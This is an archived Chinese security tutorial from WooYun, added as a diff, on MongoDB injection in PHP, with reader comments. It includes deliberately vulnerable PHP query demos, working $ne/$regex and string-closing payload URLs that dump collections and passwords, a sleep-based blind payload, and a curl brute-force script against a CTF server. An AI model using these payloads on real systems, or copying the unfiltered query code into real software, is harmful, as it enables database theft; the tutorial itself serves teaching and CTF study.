@@ -1,0 +1,141 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Mongodb注入攻击</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Th1nk</a> <span class="bull">·</span> <time title="2014/11/19 11:39" ui-time="" datetime="2014/11/19 11:39" class="published ng-binding ng-isolate-scope">2014/11/19 11:39</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>关于mongodb的基本安装运行操作以及php操作mongodb，请参考我以前的文章</p><p>php下操作mongodb的帖子国内已经有了，但是基于php下注入攻击mongodb的文章似乎还比较少。本文是笔者在学习、查阅了大量资料后的一些总结，文中涉及的攻击手法及其知识产权全部归原作者所有，我只是大自然的搬运工。未征得笔者同意，请勿转载。</p><h1>0x01 概括</h1><hr><p>php下操作mongodb大致有以下两种方式</p><p>1.用mongo类中相应的方法执行增查减改 比如：</p><pre><code>#!php
+&lt;?php
+
+$mongo = new mongoclient();
+
+$db = $mongo-&gt;myinfo; //选择数据库
+
+$coll = $db-&gt;test; //选择集合
+
+$coll-&gt;save();    //增
+
+$coll-&gt;find();    //查
+
+$coll-&gt;remove();    //减
+
+$coll-&gt;update();    //改
+</code></pre><p>此时，传递进入的参数是一个数组。</p><p>2.用execute方法执行字符串 比如：</p><pre><code>#!php
+&lt;?php
+
+$mongo = new mongoclient();
+
+$db = $mongo-&gt;myinfo; //选择数据库
+
+$query = "db.table.save({'newsid':1})";    //增
+
+$query = "db.table.find({'newsid':1})";    //查
+
+$query = "db.table.remove({'newsid':1})";    //减
+
+$query = "db.table.update({'newsid':1},{'newsid',2})";    改
+
+$result = $db-&gt;execute($query);
+</code></pre><p>此时，传进方法execute的参数就是字符串变量$query</p><p>特别的，此时的字符串书写语法为js的书写语法。</p><p>对于以上两种不同执行方式，有不同的注入攻击方式。</p><h1>0x02 注入攻击</h1><hr><p>0.在攻击前，我们需要先建立一个集合，作为攻击的基础。</p><p><img alt="enter image description here" img-src="4e9fe5a1a5a7a17d2316f194963c03b66926c2c3.jpg"></p><p>用户test是攻击者已经知道账号密码的一个测试账号，其他账号的话密码随机。想通过注入获取其他账号的密码。</p><p>1.数组绑定时的注入</p><p>一个数组绑定的查询demo如下：</p><pre><code>#!php
+&lt;?php
+$mongo = new mongoclient();
+$db = $mongo-&gt;myinfo; //选择数据库
+$coll = $db-&gt;test; //选择集合
+$username = $_GET['username'];
+$password = $_GET['password'];
+$data = array(
+        'username'=&gt;$username,
+        'password'=&gt;$password
+        );
+$data = $coll-&gt;find($data);
+$count = $data-&gt;count();
+if ($count&gt;0) {
+    foreach ($data as $user) {
+        echo 'username:'.$user['username']."&lt;/br&gt;";
+        echo 'password:'.$user['password']."&lt;/br&gt;";
+    }
+}
+else{
+    echo '未找到';
+}
+?&gt;
+</code></pre><p><img alt="enter image description here" img-src="5832968252ac695ae3273088d59238d7ba909eff.jpg"></p><p>此时的攻击利用了php可以传递数组参数的一个特性。</p><p>当传入的url为：</p><p>http://127.0.0.1/2.php?username=test&amp;password=test</p><p>执行了语句：</p><blockquote><p>db.test.find({username:'test',password:'test'});</p></blockquote><p>如果此时传入的url如下:</p><blockquote><p>http://127.0.0.1/2.php?username[xx]=test&amp;password=test</p></blockquote><p>则$username就是一个数组，也就相当于执行了php语句：</p><pre><code>#!php
+$data = array(
+'username'=&gt;array('xx'=&gt;'test'),
+'password'=&gt;'test');
+</code></pre><p>而mongodb对于多维数组的解析使最终执行了如下语句：</p><blockquote><p>db.test.find({username:{'xx':'test'},password:'test'});</p></blockquote><p>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于，小于，等于，不等于等等），完成一些攻击者预期的查询。</p><p>如，传入url:</p><blockquote><p>http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test</p></blockquote><p>结果如图</p><p><img alt="enter image description here" img-src="95a9fa671bde2896900547b42acf9541900c45bd.jpg"></p><p>因为传入的键名$ne正是一个mongodb操作符，最终执行了语句：</p><blockquote><p>db.test.find({username:{'$ne':'test'},password:{'$ne':'test'}});</p></blockquote><p>这句话相当于sql:</p><blockquote><p>select * from test where username!='test' and password!='test';</p></blockquote><p>直接便利出所有集合中的数据。</p><p>如果此时的用户名与密码不能回显，只是返回一个逻辑上的正误判断。</p><p>那么我们可以采用$regex操作符来一位一位获取数据。</p><p>案例演示：http://121.40.86.166:23339/</p><p>这是hctf中的一道题目。</p><p>猜测其php代码大概如下</p><pre><code>#!php
+&lt;?php
+$mongo = new mongoclient();
+$db = $mongo-&gt;myinfo; //选择数据库
+$coll = $db-&gt;test; //选择集合
+$lock = $_POST['lock'];
+$key = $_POST['key'];
+if (is_array($lock)) {
+    $data = array(
+        'lock'=&gt;$lock);
+    $data = $coll-&gt;find($data);
+    if ($data-&gt;count()&gt;0) {
+        echo 'the lock is right,but wrong key';
+    }else{
+        echo 'lock is wrong';
+    }
+}else{
+    if ($lock == 'aabbccdd'&amp;&amp;$key=='aabbccdd') {
+        echo 'Your flag is xxxxxxx';
+    }else{
+        echo 'lock is wrong';
+    }
+}
+?&gt;
+</code></pre><p>这样的话，因为只有“正确”或者“错误”两种回显，我们只能通过正则判断来一位一位读取lock的内容了。</p><p>对于该题的利用payload如下：</p><pre><code>#!php
+&lt;?php 
+$ch=curl_init();
+curl_setopt($ch,CURLOPT_URL,'http://121.40.86.166:23339/');
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch,CURLOPT_POST,1);
+$ori = '0123456789abcdefghijklmnopqrstuvwxyz';
+$str = '';
+for ($i=0; $i &lt;10 ; $i++) {
+    for ($j=0; $j &lt;strlen($ori) ; $j++) { 
+        $post = 'key=1&amp;lock[$regex]=^'.$str.$ori[$j];
+        curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
+        $data=curl_exec($ch);
+        if (strlen($data) == 319) {
+           $str.=$ori[$j];
+           echo $str."\r\n";
+           break;
+        }
+    }
+}
+?&gt;
+</code></pre><p>结果如图：</p><p><img alt="enter image description here" img-src="544cb60d69f39247d9457aa3d215a778faf998ff.jpg"></p><p>相当于在数据库中多次执行查询:</p><p>db.test.find({lock:{'$regex':'^a'}}); db.test.find({lock:{'$regex':'^b'}}); db.test.find({lock:{'$regex':'^c'}}); db.test.find({lock:{'$regex':'^ca'}}); …… …… db.test.find({lock:{'$regex':'^aabbccdd'}});</p><p>最终全部猜出字符串的内容,相似与sql注入中的盲注。</p><p>2.拼接字符串时的注入</p><p>因为字符串的拼接方式多种多样，不同程序员也有不同的书写习惯。</p><p>本文中仅举几个demo为例。</p><pre><code>#!php
+&lt;?php
+$username = $_GET['username'];
+$password = $_GET['password'];
+$query = "var data = db.test.findOne({username:'$username',password:'$password'});return data;";
+//$query = "return db.test.findOne();";
+//echo $query;
+$mongo = new mongoclient();
+$db = $mongo-&gt;myinfo;
+$data = $db-&gt;execute($query);
+if ($data['ok'] == 1) {
+    if ($data['retval']!=NULL) {
+        echo 'username:'.$data['retval']['username']."&lt;/br&gt;";
+        echo 'password:'.$data['retval']['password']."&lt;/br&gt;";
+    }else{
+        echo '未找到';
+    }
+}else{
+    echo $data['errmsg'];
+}
+?&gt;
+</code></pre><p>攻击方式：</p><blockquote><p>http://127.0.0.1/1.php?username=test'&amp;password=test</p></blockquote><p><img alt="enter image description here" img-src="5de695e1119bad5e270112cd2facca6e23aeb08b.jpg"></p><p>报错。 想办法闭合语句。</p><blockquote><p>http://127.0.0.1/1.php?username=test'});return {username:1,password:2}//&amp;password=test</p></blockquote><p>该语句能返回一个数组，username键值是1，password键值是2.</p><p><img alt="enter image description here" img-src="7bb14008336d422021028dc99e0298600ef3863a.jpg"></p><p>爆mongodb版本</p><blockquote><p>http://127.0.0.1/1.php?username=test'});return {username:tojson(db.getCollectionNames()),password:2};//&amp;password=test</p></blockquote><p>爆所有集合名</p><p>PS:因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写。</p><p><img alt="enter image description here" img-src="eaf5672793f26837069ed2dcbed90247ad1d5da3.jpg"></p><p>爆test集合的第一条数据</p><blockquote><p>http://127.0.0.1/1.php?username=test'});return {username:tojson(db.test.find()[0]),password:2};//&amp;password=test</p></blockquote><p><img alt="enter image description here" img-src="4b89b712dbddf48f3d89b93875005d97870cf2c6.jpg"></p><p>爆test集合的第二条数据</p><p><img alt="enter image description here" img-src="f33c6dc4a8c875202219d58d38250a14f0668104.jpg"></p><p>因为execute方法支持多语句执行，所以可以执行太多语句了，不演示~</p><p>当然，有时可能遇到没有输出返回数据，这时候怎么办呢？</p><p>在高版本下，添加了一个函数sleep()，就是时间盲注咯~</p><p>PS:在高版本下，貌似不能用注释语句，此外高版本还有一个新特性就是默认开启错误回显。笔者尝试没有注释成功，只能用闭合的方法。</p><blockquote><p>http://127.0.0.1/1.php?username=test'});if (db.version() > "0") { sleep(10000); exit; }var b=({a:'1&amp;password=test</p></blockquote><p><img alt="enter image description here" img-src="5da4665603dab8f16da9d40a57f6b559193e95f1.jpg"></p><p>成功延时了十秒。</p><p>另一个demo</p><p>在Mongdb中可以使用$where操作符。相当于sql语句中的where限制语句。mongodb中的$where操作符常常引入一个js的函数来作为限制条件，当js函数中的字符串存在未过滤的用户输入时，注入就产生了。</p><p>放demo：</p><pre><code>#!php
+&lt;?php
+$mongo = new mongoclient();
+$db = $mongo-&gt;myinfo; //选择数据库
+$coll = $db-&gt;news; //选择集合
+$news = $_GET['news'];
+$function = "function() {if(this.news == '$news') return true}";
+echo $function;
+$result = $coll-&gt;find(array('$where'=&gt;$function));
+if ($result-&gt;count()&gt;0) {
+    echo '该新闻存在';
+}else{
+    echo '该新闻不存在';
+}
+?&gt;
+</code></pre><p>为了测试，我建立了两个集合，一个是news集合，查询过程中存在注入。另一个是user集合，我们要注入得到其中的数据。</p><p>代码中的this.news指的就是表中的news栏（字段），上面的代码翻译成sql语句就是：</p><blockquote><p>select * from news where news='$news'</p></blockquote><p>该demo的注入方式可以参考如下：</p><blockquote><p>http://127.0.0.1/3.php?news=test</p></blockquote><p>返回正常</p><blockquote><p>http://127.0.0.1/3.php?news=test'</p></blockquote><p>返回错误</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26'1'=='1</p></blockquote><p>返回正常</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26'1'=='2</p></blockquote><p>返回错误</p><p>至此检测出注入，开始获取数据。</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames().length>0%26%26'1'=='1</p></blockquote><p>返回正常，集合数大于0</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames().length==5%26%26'1'=='1</p></blockquote><p>返回正常，集合数等于5</p><p><img alt="enter image description here" img-src="582a61b5b4d17102929694a7930e5c3d45f08c0a.jpg"></p><p>获取集合名称</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()[0].length==6%26%26'1'=='1</p></blockquote><p>返回正常，第一个集合名称长度为6</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()&#91;0&#93;&#91;0&#93;>'a'%26%26'1'=='1</p></blockquote><p>返回正常，第一个集合名称第一个字符大于a</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()&#91;0&#93;&#91;0&#93;=='m'%26%26'1'=='1</p></blockquote><p>返回正常，第一个集合名称第一个字符为m</p><p><img alt="enter image description here" img-src="736ca15d73b25d5de2a53ea1ba0ebf456103cb52.jpg"></p><p>最终可以破解出存在user集合。</p><p>查user集合中的第一条数据。</p><blockquote><p>http://127.0.0.1/3.php?news=test'%26%26tojson(db.user.find()[0])[0]=='{'%26%26'1'=='1</p></blockquote><p>因为db.user.find()返回的不是一个字符串，无法取出字符进行比较，我们可以将它转化成一个json字符串，就可以比较了。 道理讲明白了，剩下的都是体力活，用python或者php写下小脚本就能实现自动化。</p><h1>0x03 Referer</h1><hr><p>http://drops.wooyun.org/papers/850</p><p>http://webcache.googleusercontent.com/search?q=cache:fPNiwObqKcEJ:hi.baidu.com/d4rkwind/item/ad7b81efb799ce2e6dabb8c3+&amp;cd=1&amp;hl=zh-CN&amp;ct=clnk&amp;gl=cn</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/201504011416542488cbfdc29859a9e95774fa3ce4ff5b.jpg" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/4605" rel="bookmark" id="re1">SQL Injection via DNS</a></li><li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re2">php4fun.sinaapp.com PHP挑战通关攻略</a></li><li><a href="http://drops.wooyun.org/papers/850" rel="bookmark" id="re3">Attacking MongoDB</a></li><li><a href="http://drops.wooyun.org/tips/858" rel="bookmark" id="re4">PHP漏洞挖掘思路+实例 第二章</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2016-02-26 15:24:58</span></div><p></p><p>学习了，谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">玉林嘎</span> <span class="reply-time">2015-02-05 02:22:29</span></div><p></p><p>super??</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mayafei</span> <span class="reply-time">2015-02-04 09:42:08</span></div><p></p><p>路过，膜拜一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">izy</span> <span class="reply-time">2014-11-27 20:50:35</span></div><p></p><p>膜拜音符大牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">addbook</span> <span class="reply-time">2014-11-26 15:48:30</span></div><p></p><p>还好看了，以后mongo查询还是封装成ORM，做好字段检查</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sm0nk</span> <span class="reply-time">2014-11-25 22:11:10</span></div><p></p><p>hao</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龍 、</span> <span class="reply-time">2014-11-23 22:12:14</span></div><p></p><p>学习，更进一步！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">酱油党</span> <span class="reply-time">2014-11-21 13:59:19</span></div><p></p><p>膜拜音符大牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">syjzwjj</span> <span class="reply-time">2014-11-20 23:28:53</span></div><p></p><p>膜拜音符大牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2014-11-20 14:42:56</span></div><p></p><p>好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">啊L川</span> <span class="reply-time">2014-11-20 14:39:11</span></div><p></p><p>也是醉了，，在win下 死活装不上php5.5.9 的mongo扩展</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">啊L川</span> <span class="reply-time">2014-11-20 12:01:46</span></div><p></p><p>测试地址</p><p>http://html.test.com/mongo/demo1.php?username=test%27&amp;password=test</p><p>返回<br>exception: SyntaxError: Unexpected string</p><p>试着闭合的时候也是这个错 求解</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wa3lker</span> <span class="reply-time">2014-11-20 11:21:31</span></div><p></p><p>学习，更进一步！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Sura、Rain</span> <span class="reply-time">2014-11-19 20:54:46</span></div><p></p><p>不是所有语言都像PHP一样都能传入这种mongodb操作符的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">chock</span> <span class="reply-time">2014-11-19 17:35:31</span></div><p></p><p>nosql 注入的时代来了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2014-11-19 16:56:37</span></div><p></p><p>Mark。。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Th1nk</span> <span class="reply-time">2014-11-19 15:43:30</span></div><p></p><p>时雨牛说笑了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2014-11-19 15:15:04</span></div><p></p><p>音符大屌赚钱了，不考虑请大伙吃个饭么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2014-11-19 13:51:36</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SPRITEKING</span> <span class="reply-time">2014-11-19 12:59:26</span></div><p></p><p>火钳刘明</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">l137</span> <span class="reply-time">2014-11-19 11:48:06</span></div><p></p><p>去年一不小心一个修改用户昵称的mongo的注入提交$ne把公司用户昵称都改了....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x_Jin</span> <span class="reply-time">2014-11-19 11:45:44</span></div><p></p><p>不错，之前用node.js+mongodb写东西的时候 还真没想着去注入。。。</p><p></p></div></div></div></div></div></main>
